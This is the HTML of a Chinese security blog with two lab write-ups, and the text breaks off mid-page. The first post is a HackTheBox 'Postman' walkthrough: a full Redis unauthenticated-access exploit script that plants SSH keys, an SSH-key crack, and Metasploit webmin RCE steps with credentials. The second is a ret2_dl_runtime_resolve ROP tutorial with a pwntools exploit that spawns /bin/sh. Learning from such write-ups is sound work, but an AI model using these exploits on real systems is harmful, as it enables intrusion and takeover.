@@ -1,0 +1,1256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="jumbotron">
+  <div class="video">
+    
+      <div class="video-frame">
+        <img src="/images/ocean/overlay-hero.png" alt="Decorative image frame">
+      </div>
+    
+    <div class="video-media">
+      <video playsinline="" autoplay="" loop="" muted="" data-autoplay=""
+             poster="/images/ocean/ocean.png" x5-video-player-type="h5">
+        <source src="/images/ocean/ocean.mp4" type="video/mp4">
+        <source src="/images/ocean/ocean.ogv" type="video/ogg">
+        <source src="/images/ocean/ocean.webm" type="video/webm">
+        <p>Your user agent does not support the HTML5 Video element.</p>
+      </video>
+      <div class="video-overlay"></div>
+    </div>
+    <div class="video-inner text-center text-white">
+      <h1><a href="/">yichen&#39;s blog</a></h1>
+      <p></p>
+      <div><img src="/images/head.png" class="brand" alt="yichen&#39;s blog"></div>
+    </div>
+    <div class="video-learn-more">
+      <a class="anchor" href="#landingpage"><i class="fe fe-mouse"></i></a>
+    </div>
+  </div>
+</section>
+
+<div id="landingpage">
+  <section class="outer">
+    <article class="articles">
+      
+      <h1 class="page-type-title"></h1>
+      
+        
+          <article id="post-pehmm1" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/02/27/pehmm1/">Postman</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/27/pehmm1/" class="article-date">
+  <time datetime="2020-02-27T08:53:54.000Z" itemprop="datePublished">2020-02-27</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582795803744-b10ecc9d-c7d6-4589-95a2-d0d6a7395f8e.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=842&originWidth=1548&size=214891&status=done&style=none&width=774" alt="image.png"></p>
+<p>nmap  扫描一波端口：<br><code>nmap -A -Pn -T4 10.10.10.160</code><br>-Pn    将所有主机视作开启，跳过主机发现的过程<br>-A     OS 识别,版本探测，脚本扫描和 traceroute<br>-T  （0-5）时间优化</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582802742965-ab22a6a1-3d86-430f-97ba-3da9b048aea8.png#align=left&display=inline&height=401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=705&originWidth=904&size=177726&status=done&style=none&width=514" alt="image.png"></p>
+<p>去看一下，80  端口没什么东西， 10000，用 https  访问，有个登录界面，弱口令没得</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582802991547-eb8ac4a8-ea0b-4353-98f3-81f51660d240.png#align=left&display=inline&height=401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=582&originWidth=1044&size=47949&status=done&style=none&width=720" alt="image.png"></p>
+<p>扫描发现 6379  是开着的，（实在是太慢了，我就直接指定去扫了）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582805023860-6bfd6290-bd6b-4ecd-b736-30ee53cf5446.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=211&originWidth=637&size=40684&status=done&style=none&width=402" alt="image.png"></p>
+<p>redis  未授权访问</p>
+<p>apt install redis-server  安装  redis  客户端，然后  pip install termcolor  安装需要的库</p>
+<p>使用：<a href="https://github.com/Avinash-acid/Redis-Server-Exploit" target="_blank" rel="noopener">https://github.com/Avinash-acid/Redis-Server-Exploit</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#Author : Avinash Kumar Thapa aka -Acid</span></span><br><span class="line"><span class="comment">#Twitter : https://twitter.com/m_avinash143</span></span><br><span class="line"><span class="comment">#####################################################################################################################################################</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"></span><br><span class="line">script, ip_address, username = argv</span><br><span class="line"></span><br><span class="line">PATH=<span class="string">'/usr/bin/redis-cli'</span></span><br><span class="line">PATH1=<span class="string">'/usr/local/bin/redis-cli'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_connection</span><span class="params">()</span>:</span></span><br><span class="line">	shell = <span class="string">"ssh -i "</span> + <span class="string">'$HOME/.ssh/id_rsa '</span> + username+<span class="string">"@"</span>+ip_address</span><br><span class="line">	os.system(shell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(PATH) <span class="keyword">or</span> os.path.isfile(PATH1):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    	<span class="keyword">print</span> colored(<span class="string">'\t*******************************************************************'</span>, <span class="string">"green"</span>)</span><br><span class="line">    	<span class="keyword">print</span> colored(<span class="string">'\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*'</span> ,<span class="string">"green"</span>)</span><br><span class="line">    	<span class="keyword">print</span> colored(<span class="string">'\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                '</span>, <span class="string">"green"</span>)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">'\t*******************************************************************'</span>, <span class="string">"green"</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">"\t SSH Keys Need to be Generated"</span>, <span class="string">'blue'</span>)</span><br><span class="line">		os.system(<span class="string">'ssh-keygen -t rsa -C \"acid_creative\"'</span>)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">"\t Keys Generated Successfully"</span>, <span class="string">"blue"</span>)</span><br><span class="line">		os.system(<span class="string">"(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') &gt; $HOME/.ssh/public_key.txt"</span>)</span><br><span class="line">		cmd = <span class="string">"redis-cli -h "</span> + ip_address + <span class="string">' flushall'</span></span><br><span class="line">		cmd1 = <span class="string">"redis-cli -h "</span> + ip_address</span><br><span class="line">		os.system(cmd)</span><br><span class="line">		cmd2 = <span class="string">"cat $HOME/.ssh/public_key.txt | redis-cli -h "</span> +  ip_address + <span class="string">' -x set cracklist'</span></span><br><span class="line">		os.system(cmd2)</span><br><span class="line">		cmd3 = cmd1 + <span class="string">' config set dbfilename "backup.db" '</span></span><br><span class="line">		cmd4 = cmd1 + <span class="string">' config set  dir'</span> + <span class="string">" /usr/lib/"</span>+username+<span class="string">"/.ssh/"</span></span><br><span class="line">		cmd5 = cmd1 + <span class="string">' config set dbfilename "authorized_keys" '</span></span><br><span class="line">		cmd6 = cmd1 + <span class="string">' save'</span></span><br><span class="line">		os.system(cmd3)</span><br><span class="line">		os.system(cmd4)</span><br><span class="line">		os.system(cmd5)</span><br><span class="line">		os.system(cmd6)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">"\tYou'll get shell in sometime..Thanks for your patience"</span>, <span class="string">"green"</span>)</span><br><span class="line">		ssh_connection()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Something went wrong"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> colored(<span class="string">"\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further."</span>, <span class="string">"red"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>关于 redis 核心利用点是，<strong>通过没有身份校验的 redis 服务进行登陆</strong>，同时<strong>指定 config dir 和 config dbfilename 的路径与名称</strong>，达到<strong>把本地公钥存储到远程服务器</strong>上，这时候在通过 ssh 进行远程登陆。可以<strong>获得名为 redis 的 shell</strong></p>
+<p><code>python redis.py 10.10.10.160 redis</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582808571536-7594ad74-d490-43fd-9285-a02c952b5b0d.png#align=left&display=inline&height=525&margin=%5Bobject%20Object%5D&name=image.png&originHeight=764&originWidth=771&size=105621&status=done&style=none&width=530" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582808590618-4b9b5faa-6162-4778-86c5-9ff9f3f91128.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&name=image.png&originHeight=493&originWidth=896&size=115416&status=done&style=none&width=633" alt="image.png"></p>
+<p>再  opt  目录下找到 id_rsa.bak</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582860440319-87010c5c-1190-49a1-8533-4372be591ac9.png#align=left&display=inline&height=560&margin=%5Bobject%20Object%5D&name=image.png&originHeight=724&originWidth=653&size=277680&status=done&style=none&width=505" alt="image.png"></p>
+<p>保存出来，用 john  破解一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582860526552-c0181956-da49-435f-9552-6f529d08ff9b.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=897&size=96045&status=done&style=none&width=572" alt="image.png"></p>
+<p>su Matt  切换一下账户，用破解出来得密码来登录，再 Matt 家目录下有  user.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582860892717-272efab3-aa9e-4dd4-9cc4-54d2b7c4ed08.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=image.png&originHeight=127&originWidth=431&size=24417&status=done&style=none&width=388" alt="image.png"></p>
+<p>同时，这个用户名和密码可以登录之前那个 10000  端口的  webmin  可以登录成功<br>可以用  msf  来攻击<br>msfconsole，打开  msf</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582861564220-13f901c6-27b1-4c57-a29c-4fdd747cf668.png#align=left&display=inline&height=358&margin=%5Bobject%20Object%5D&name=image.png&originHeight=716&originWidth=846&size=105867&status=done&style=none&width=423" alt="image.png"></p>
+<p>使用：<br>use exploit/linux/http/webmin_packageup_rce   //选择  payload<br>set rhosts 10.10.10.160     //设置攻击目标<br>set ssl true     //使用  https<br>set username Matt    //  设置  username<br>set password computer2008     //设置  password<br>set lhost 10.10.14.18     //设置反弹  shell  的地址（本机 IP）<br>exploit    //执行攻击</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582862011791-f2e3dd50-894c-4b2e-aaaa-c90b5aab7ea8.png#align=left&display=inline&height=376&margin=%5Bobject%20Object%5D&name=image.png&originHeight=677&originWidth=906&size=128732&status=done&style=none&width=503" alt="image.png"></p>
+<p>在 /root/root.txt  中存在  root  级别的  flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582862045912-634a471b-c4ab-45f0-87f1-9ef1a67a8fdc.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=217&originWidth=346&size=15941&status=done&style=none&width=346" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/27/pehmm1/" data-id="ckco53qbf000c8ou92whn944h" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-erh0l7" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2020/02/25/erh0l7/">PWN入门（Advanced ROP）</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/25/erh0l7/" class="article-date">
+  <time datetime="2020-02-25T07:06:56.000Z" itemprop="datePublished">2020-02-25</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="ret2-dl-runtime-resolve"><a href="#ret2-dl-runtime-resolve" class="headerlink" title="ret2_dl_runtime_resolve"></a>ret2_dl_runtime_resolve</h1><p>之前在  ret2libc  那块讲过的那个  <a href="https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#5dvaL" target="_blank" rel="noopener">动态链接</a>  讲过，程序使用这个东西来进行延迟绑定的时候重定位的<br>如果我们可以控制相应的参数及其对应地址内容，就可以控制解析的函数了</p>
+<p>XDCTF 2015 pwn200 源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">"Welcome to XDCTF2015~!\n"</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译：<br><code>gcc -o main -m32 -fno-stack-protector bof.c</code></p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1、dl_resolve  不会检查对应的参数是否越界<br>2、dl_resolve  函数最后解析依赖于所给定的字符串</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考：<a href="https://bbs.pediy.com/thread-250703.htm" target="_blank" rel="noopener">[原创]ROP 高级用法之 ret2_dl_runtime_resolve</a></p>
+<p>1、首先使用  link_map  访问 .dynamic，分别取出 .dynstr、.dynsym、.rel.plt  的地址<br>2、.rel.plt +  参数  reloc_arg，求出当前函数的重定位表项 Elf32_Rel  的指针，记作  rel<br>3、rel 的 r_info &gt;&gt; 8  作为 .dynsym  的下标，求出当前函数的符号表项 Elf32_Sym  的指针，记作  sym<br>4、.dynstr + sym -&gt; st_name  得出符号名字符串指针<br>5、在动态链接库查找这个函数地址，并且把地址赋值给 *rel -&gt; r_offset，即 GOT  表<br>6、调用这个函数</p>
+<h3 id="调试理解"><a href="#调试理解" class="headerlink" title="调试理解"></a>调试理解</h3><p>在调用函数  strlen  的这个  call  下个断点：b *0x8048588</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582616659146-1b9e4a14-97dc-46a3-98c2-526a781b2dd8.png#align=left&display=inline&height=187&margin=%5Bobject%20Object%5D&name=image.png&originHeight=374&originWidth=1232&size=162984&status=done&style=none&width=616" alt="image.png"></p>
+<p>run  的时候把程序给断下来，然后  si  跟进这个  call  来看一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582868152973-5d41bea0-368a-4b85-bb78-4b49f54202f1.png#align=left&display=inline&height=418&margin=%5Bobject%20Object%5D&name=image.png&originHeight=730&originWidth=726&size=165263&status=done&style=none&width=416" alt="image.png"></p>
+<p>进去之后可以看到首先会去执行下面这一块</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582868363515-e71745d7-6861-4ebd-bb76-b5b4f5b5256b.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=735&originWidth=735&size=179263&status=done&style=none&width=367.5" alt="image.png"><br>对应之前讲的，跳转到自己的  plt  表项</p>
+<p>继续单步执行，看一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582869160689-a53906ff-5427-4a98-b3f4-728e4ae8e36b.png#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&name=image.png&originHeight=549&originWidth=724&size=137698&status=done&style=none&width=422" alt="image.png"><br>对应之前讲的跳转到公共的  plt  表项</p>
+<p>又一次进行了跳转</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582869214418-4dd76ec6-48f4-4426-867f-25275d672a95.png#align=left&display=inline&height=413&margin=%5Bobject%20Object%5D&name=image.png&originHeight=678&originWidth=725&size=142755&status=done&style=none&width=442" alt="image.png"><br>对应之前讲的跳转到  dl_runtime_resolve  函数</p>
+<p>这个地方就是  dl_runtime_resolve  了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582869335579-2f47c685-b87f-4607-825b-247920f32980.png#align=left&display=inline&height=359&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=726&size=116346&status=done&style=none&width=441" alt="image.png"></p>
+<p>需要注意的是，之前跳转的时候，程序  push  了两个参数，一个是 0x10，一个是 0x804a004  里面的内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582869600769-de9be9b1-fa29-4c5a-9d32-aa585555a8ba.png#align=left&display=inline&height=344&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=738&size=125942&status=done&style=none&width=510" alt="image.png"></p>
+<p>这两个参数就是 dl_runtime_resolve  这个函数的两个参数，我们看一下，0x804a004 里面存着什么<br>这个地址就是   link_map  的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582869661270-6e1eada7-527c-42bb-83a6-fb03f9c1d289.png#align=left&display=inline&height=76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=267&size=8094&status=done&style=none&width=274" alt="image.png"></p>
+<p>通过这个地址就可以找到 .dynamic  的地址，第三个就是 0x8049f14</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582870661735-8c8a37af-bc53-4879-8ccb-e5cf64fd5ed4.png#align=left&display=inline&height=65&margin=%5Bobject%20Object%5D&name=image.png&originHeight=102&originWidth=685&size=16712&status=done&style=none&width=436" alt="image.png"></p>
+<p>再根据这一个找到 .dynstr、 .dynsym、 .rel.plt 的地址</p>
+<ul>
+<li>.dynstr  的地址是 .dynamic + 0x44 -&gt; 0x08048278</li>
+<li>.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481d8</li>
+<li>.rel.plt  的地址是 .dynamic + 0x84 -&gt; 0x08048330</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582871099116-5c0eb247-da04-40a2-bab3-27e793792a5f.png#align=left&display=inline&height=150&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=682&size=38766&status=done&style=none&width=486" alt="image.png"></p>
+<p>.rel.plt  的地址加上参数  reloc_arg，即  0x08048330 + 0x10 -&gt; 0x8048340<br>找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582871465535-12244d8f-17fc-49ca-8ea8-0e47fbb05dff.png#align=left&display=inline&height=71&margin=%5Bobject%20Object%5D&name=image.png&originHeight=89&originWidth=692&size=16080&status=done&style=none&width=553" alt="image.png"></p>
+<p>通过这个 rel  可以得到以下信息</p>
+<blockquote>
+<p>r_offset = 0x0804a014   //指向 GOT 表的指针<br>r_info = 0x00000407</p>
+</blockquote>
+<p>将 r_info&gt;&gt;8,即 0x00000407&gt;&gt;8 = 4 作为.dynsym 中的下标，这里的 “&gt;&gt;” 意思是右移</p>
+<p>我们来到  0x080481d8（上面找到的那个 .dynsym  的地址）看一下，在标号为 4  的地方，就是函数名称的偏移：name_offset</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582872483716-7385a988-246b-43c1-9b62-30fab4ee9177.png#align=left&display=inline&height=117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=164&originWidth=730&size=30270&status=done&style=none&width=520" alt="image.png"></p>
+<p>.dynstr + name_offset  就是这个函数的符号名字符串 st_name<br>0x08048278 + 0x20 -&gt; 0x8048298‬</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582872986851-d5c16d7b-7af1-4a6b-bf01-6a5ab0fa2e98.png#align=left&display=inline&height=50&margin=%5Bobject%20Object%5D&name=image.png&originHeight=45&originWidth=237&size=5066&status=done&style=none&width=263" alt="image.png"></p>
+<p>最后在动态链接库查找这个函数的地址，并且把地址赋值给 *rel -&gt; r_offset，即 GOT 表就可以了</p>
+<p><strong>整理一下：</strong></p>
+<ol>
+<li>dl_runtime_resolve 需要两个参数，一个是 reloc_arg，就是函数自己的 plt 表项 push 的内容，一个是 link_map，这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic 的地址</li>
+<li>而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址</li>
+<li>.rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info</li>
+<li>将 r_info&gt;&gt;8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset</li>
+<li>.dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名</li>
+<li>在动态链接库里面找这个函数的地址，赋值给 *rel-&gt;r_offset，也就是 GOT 表就完成了一次函数的动态链接</li>
+</ol>
+<h2 id="pediy-思路"><a href="#pediy-思路" class="headerlink" title="pediy 思路"></a>pediy 思路</h2><p>实际上，dl_runtime_resolve  是通过最后的 st_name  来确定执行那一个函数的，也就是说，可以通过控制这个地址的内容来执行任意函数，比如：system<br>而  reloc_arg  是我们可控的，我们需要把  reloc_arg  可控间接控制  st_name</p>
+<p>我们可以在一段地址上伪造一段结构直接修改 .dynstr</p>
+<p><strong>计算 reloc_arg</strong></p>
+<p>objdump -s -j .rel.plt ./main</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582874663974-d30fec92-6273-4152-87ac-4b58beb11076.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=190&originWidth=674&size=40386&status=done&style=none&width=525" alt="image.png"></p>
+<p><code>reloc_arg = fake_rel_plt_addr - 0x8048330</code></p>
+<p><strong>计算 r_info</strong></p>
+<p><code>n = (欲伪造的地址- .dynsym 基地址) / 0x10</code><br><code>r_info = n&lt;&lt;8</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582875199470-5a6db8f4-3d69-4f2f-9515-84fb9f9bc894.png#align=left&display=inline&height=251&margin=%5Bobject%20Object%5D&name=image.png&originHeight=312&originWidth=661&size=55607&status=done&style=none&width=532" alt="image.png"></p>
+<p>还需要过#define ELF32_R_TYPE(val)   ((val) &amp; 0xff)宏定义，ELF32_R_TYPE(r_info)=7，因此<br><code>r_info = r_info + 0x7</code></p>
+<p><strong>计算 name_offset</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582876128410-dff8884c-6d96-4a3d-83a2-2693a7239953.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&name=image.png&originHeight=236&originWidth=657&size=56330&status=done&style=none&width=534" alt="image.png"></p>
+<p><code>st_name = fake_dynstr_addr - 0x804821c</code></p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">name = <span class="string">'./main'</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf= ELF(name)</span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr   <span class="comment">#0x8048330</span></span><br><span class="line">dynsym_addr =  elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr    <span class="comment">#0x80481d8</span></span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr     <span class="comment">#0x8048278</span></span><br><span class="line">resolve_plt = <span class="number">0x08048380</span></span><br><span class="line">leave_ret_addr = <span class="number">0x8048458</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x804aa00</span></span><br><span class="line">fake_rel_plt_addr = start</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh_addr = fake_dynstr_addr + <span class="number">0x7</span></span><br><span class="line"><span class="comment">#n就是reloc_arg</span></span><br><span class="line">n = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_offset = fake_dynstr_addr - dynstr_addr</span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">'read'</span>]) + p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line">pay1 = <span class="string">'a'</span>*<span class="number">108</span> + p32(start - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret_addr) + p32(<span class="number">0</span>) + p32(start - <span class="number">20</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line">pay2 = p32(<span class="number">0x0</span>) + p32(resolve_plt) + p32(n) + <span class="string">'aaaa'</span> + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">success(<span class="string">".rel_plt: "</span> + hex(rel_plt_addr))</span><br><span class="line">success(<span class="string">".dynsym: "</span> + hex(dynsym_addr))</span><br><span class="line">success(<span class="string">".dynstr: "</span> + hex(dynstr_addr))</span><br><span 